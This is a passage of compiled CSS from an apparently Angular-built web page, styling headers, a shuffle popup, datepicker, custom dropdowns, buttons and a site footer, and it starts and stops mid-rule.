            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7],
            .header-text-small[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c7] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c7] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c7] {
            float: left
        }

        .fright[_ngcontent-gtc-c7] {
            float: right
        }

        .row[_ngcontent-gtc-c7] .padding-left-0[_ngcontent-gtc-c7] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c7] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c7] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c7] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c7] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c7]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c7] .shuffle-container[_ngcontent-gtc-c7] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c7] .shuffle-container[_ngcontent-gtc-c7]>.row[_ngcontent-gtc-c7] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c7] .shuffle-container[_ngcontent-gtc-c7] .shuffle-pop-table[_ngcontent-gtc-c7] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c7] .shuffle-container[_ngcontent-gtc-c7] .shuffle-pop-table[_ngcontent-gtc-c7] .shuffle-pop-item[_ngcontent-gtc-c7] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c7] .shuffle-container[_ngcontent-gtc-c7] .shuffle-pop-table[_ngcontent-gtc-c7] .shuffle-pop-item.img[_ngcontent-gtc-c7] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c7] .shuffle-container[_ngcontent-gtc-c7] img[_ngcontent-gtc-c7] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c7] .shuffle-container[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c7] .shuffle-container[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] strong[_ngcontent-gtc-c7] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c7] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c7] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c7]>.mat-calendar-body-cell-content[_ngcontent-gtc-c7]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c7],
        .mat-calendar-table-header[_ngcontent-gtc-c7] th[_ngcontent-gtc-c7],
        .mat-datepicker-content[_ngcontent-gtc-c7] .mat-calendar-next-button[_ngcontent-gtc-c7],
        .mat-datepicker-content[_ngcontent-gtc-c7] .mat-calendar-previous-button[_ngcontent-gtc-c7],
        .mat-datepicker-toggle[_ngcontent-gtc-c7],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c7] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c7] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c7] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c7] .mat-calendar-body-active[_ngcontent-gtc-c7]>.mat-calendar-body-cell-content[_ngcontent-gtc-c7]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c7] .mat-calendar-body-active[_ngcontent-gtc-c7]>.mat-calendar-body-cell-content[_ngcontent-gtc-c7]:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell[_ngcontent-gtc-c7]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c7]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c7]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c7] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c7] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary[_ngcontent-gtc-c7] .mat-option.mat-selected[_ngcontent-gtc-c7]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c7] .mat-option[_ngcontent-gtc-c7] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c7] div[_ngcontent-gtc-c7],
        .ngx-editor-textarea[_ngcontent-gtc-c7] section[_ngcontent-gtc-c7] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c7] div[_ngcontent-gtc-c7] img[_ngcontent-gtc-c7],
        .ngx-editor-textarea[_ngcontent-gtc-c7] section[_ngcontent-gtc-c7] img[_ngcontent-gtc-c7] {
            width: 100% !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c7] a[_ngcontent-gtc-c7] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c7] *[_ngcontent-gtc-c7] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c7] b[_ngcontent-gtc-c7] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c7] b[_ngcontent-gtc-c7] *[_ngcontent-gtc-c7] {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c7] td[_ngcontent-gtc-c7] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c7] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c7] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c7] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c7] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c7] img[_ngcontent-gtc-c7] {
            width: 50px;
            opacity: .5
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__top[_ngcontent-gtc-c7] {
            padding: 30px 0;
            background: #1d1f23;
            border-top: 1px solid transparent;
            -o-border-image: linear-gradient(to right, #1e2024, #7b7c7e, #1e2024);
            border-image: linear-gradient(to right, #1e2024, #7b7c7e, #1e2024);
            border-image-slice: 1
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__top[_ngcontent-gtc-c7] .container[_ngcontent-gtc-c7] {
            width: 1300px
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c7] {
                float: right
            }
            .fright[_ngcontent-gtc-c7] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c7] .shuffle-container[_ngcontent-gtc-c7] .shuffle-pop-table[_ngcontent-gtc-c7] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c7] button.mat-icon-button[_ngcontent-gtc-c7] {
                top: auto;
                bottom: 7px
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__top[_ngcontent-gtc-c7] .container[_ngcontent-gtc-c7] {
                width: 100%
            }
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom[_ngcontent-gtc-c7] {
            background: #131319
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom[_ngcontent-gtc-c7] .container[_ngcontent-gtc-c7] {
            width: 1300px
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item[_ngcontent-gtc-c7] {
            display: inline-block;
            vertical-align: middle
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--left[_ngcontent-gtc-c7] a[_ngcontent-gtc-c7] {
            overflow: hidden;
            display: inline-block;
            border-radius: 3px
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--left[_ngcontent-gtc-c7] img[_ngcontent-gtc-c7] {
            width: 100px
        }

        @media (max-width:767px) {
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom[_ngcontent-gtc-c7] .container[_ngcontent-gtc-c7] {
                width: 100%
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom[_ngcontent-gtc-c7] {
                padding: 10px 0
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__item[_ngcontent-gtc-c7] {
                display: block
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--left[_ngcontent-gtc-c7] {
                margin-bottom: 15px
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--left[_ngcontent-gtc-c7] img[_ngcontent-gtc-c7] {
                width: 70px
            }
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--middle[_ngcontent-gtc-c7] {
            margin: 0 30px
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--middle[_ngcontent-gtc-c7] ul[_ngcontent-gtc-c7] {
            padding: 0;
            margin: 0
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--middle[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] {
            padding: 0 15px;
            display: inline-block;
            vertical-align: middle
        }

        @media (max-width:767px) {
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--middle[_ngcontent-gtc-c7] {
                margin: 0
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--middle[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] {
                padding: 10px 0;
                display: block;
                border-bottom: 1px solid #6a707d
            }
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--middle[_ngcontent-gtc-c7] a[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            text-decoration: none
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] {
            float: right;
            margin-top: 15px
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] .media[_ngcontent-gtc-c7] {
            margin: 0;
            display: inline-block;
            vertical-align: middle
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] .media.social-media[_ngcontent-gtc-c7] {
            margin-top: 4px
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] .media[_ngcontent-gtc-c7] h4[_ngcontent-gtc-c7] {
            margin: 0 10px 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] .media[_ngcontent-gtc-c7] h4.connected[_ngcontent-gtc-c7] {
            margin-top: 3px
        }

        @media (max-width:767px) {
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] {
                float: none;
                padding-top: 30px;
                padding-bottom: 10px
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] .media[_ngcontent-gtc-c7] {
                display: block
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] .media[_ngcontent-gtc-c7] h4[_ngcontent-gtc-c7] {
                margin: 0 0 10px
            }
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] .media[_ngcontent-gtc-c7] a[_ngcontent-gtc-c7] {
            display: inline-block;
            margin: 0 6px
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] .media[_ngcontent-gtc-c7] img[_ngcontent-gtc-c7] {
            width: 25px
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] {
            display: inline-block;
            vertical-align: middle
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
            margin: 0;
            font-family: Montserrat;
            font-size: 12px;
            color: #fff
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] ul[_ngcontent-gtc-c7] {
            padding: 20px 0;
            margin: 0 0 0 40px
        }

        @media (max-width:767px) {
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__item.site-footer__item--right[_ngcontent-gtc-c7] .media[_ngcontent-gtc-c7] a[_ngcontent-gtc-c7] {
                margin: 0 10px 0 0
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] {
                display: block;
                padding: 6px 0
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
                font-size: .8em
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] ul[_ngcontent-gtc-c7] {
                margin: 0;
                padding: 0
            }
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] {
            padding: 0 15px;
            position: relative;
            list-style: none;
            display: inline-block;
            vertical-align: middle
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] li.privacy-policy[_ngcontent-gtc-c7] {
            margin: 0 15px 1px
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7]::after {
            font-family: Montserrat;
            color: #fff;
            position: absolute;
            content: '|';
            right: 0;
            top: 0
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7]:last-child::after {
            content: ''
        }

        footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7]>a[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            font-size: 12px;
            color: #fff;
            text-decoration: none
        }

        @media (max-width:767px) {
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] li.privacy-policy[_ngcontent-gtc-c7] {
                margin: 0
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] {
                padding-left: 0;
                margin-right: 10px
            }
            footer.site-footer[_ngcontent-gtc-c7] .site-footer__bottom__item[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7]>a[_ngcontent-gtc-c7] {
                font-size: .8em
            }
        }

        @media print {
            .site-footer[_ngcontent-gtc-c7] {
                display: none
            }
        }
    </style>
    <style>
        .justify-content-left[_ngcontent-gtc-c9] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c9] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c9] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c9] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c9] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c9] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c9] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c9] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c9] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c9] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c9] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c9] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c9] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c9] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c9] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c9] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c9] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c9] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c9] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c9] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c9] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c9] button.mat-icon-button[_ngcontent-gtc-c9] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c9] button.mat-icon-button[_ngcontent-gtc-c9] span.mat-button-wrapper[_ngcontent-gtc-c9],
        .mat-datepicker-toggle[_ngcontent-gtc-c9] button.mat-icon-button[_ngcontent-gtc-c9] span.mat-button-wrapper[_ngcontent-gtc-c9] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c9] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c9] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c9] i.fa-caret-down[_ngcontent-gtc-c9] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c9] input[type=text][_ngcontent-gtc-c9] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c9] .cust-option[_ngcontent-gtc-c9] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c9] .cust-option.active[_ngcontent-gtc-c9] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c9] .cust-option[_ngcontent-gtc-c9] ul.option-list[_ngcontent-gtc-c9] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c9] .cust-option[_ngcontent-gtc-c9] ul.option-list[_ngcontent-gtc-c9] li[_ngcontent-gtc-c9] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c9] .cust-option[_ngcontent-gtc-c9] ul.option-list[_ngcontent-gtc-c9] li[_ngcontent-gtc-c9] label[_ngcontent-gtc-c9] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c9] .cust-option[_ngcontent-gtc-c9] ul.option-list[_ngcontent-gtc-c9] li[_ngcontent-gtc-c9] label[_ngcontent-gtc-c9]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c9] .cust-option[_ngcontent-gtc-c9] ul.option-list[_ngcontent-gtc-c9] li[_ngcontent-gtc-c9] label[_ngcontent-gtc-c9]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c9] .cust-option[_ngcontent-gtc-c9] ul.option-list[_ngcontent-gtc-c9] li[_ngcontent-gtc-c9] input[type=radio][_ngcontent-gtc-c9] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c9] .cust-option[_ngcontent-gtc-c9] ul.option-list[_ngcontent-gtc-c9] li[_ngcontent-gtc-c9] input[type=radio][_ngcontent-gtc-c9]:checked+label[_ngcontent-gtc-c9]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c9] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c9] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c9],
        label[_ngcontent-gtc-c9],
        ol[_ngcontent-gtc-c9] li[_ngcontent-gtc-c9],
        table[_ngcontent-gtc-c9] td[_ngcontent-gtc-c9],
        table[_ngcontent-gtc-c9] th[_ngcontent-gtc-c9],
        ul[_ngcontent-gtc-c9] li[_ngcontent-gtc-c9] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c9] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c9],
        h2[_ngcontent-gtc-c9],
        h3[_ngcontent-gtc-c9],
        h4[_ngcontent-gtc-c9],
        h5[_ngcontent-gtc-c9],
        h6[_ngcontent-gtc-c9],
        p[_ngcontent-gtc-c9],
        span[_ngcontent-gtc-c9] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c9] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c9],
        textarea[_ngcontent-gtc-c9] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c9] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c9] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c9] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c9] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c9] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c9] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c9] span[_ngcontent-gtc-c9] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c9] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c9] p.close-circle[_ngcontent-gtc-c9] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c9] p.close-circle[_ngcontent-gtc-c9] span[_ngcontent-gtc-c9] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c9] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c9] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c9] span[_ngcontent-gtc-c9] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c9] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c9] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c9] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c9] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c9] span[_ngcontent-gtc-c9] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c9] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c9] p[_ngcontent-gtc-c9] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c9] span[_ngcontent-gtc-c9] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control[_ngcontent-gtc-c9] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c9] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c9] {
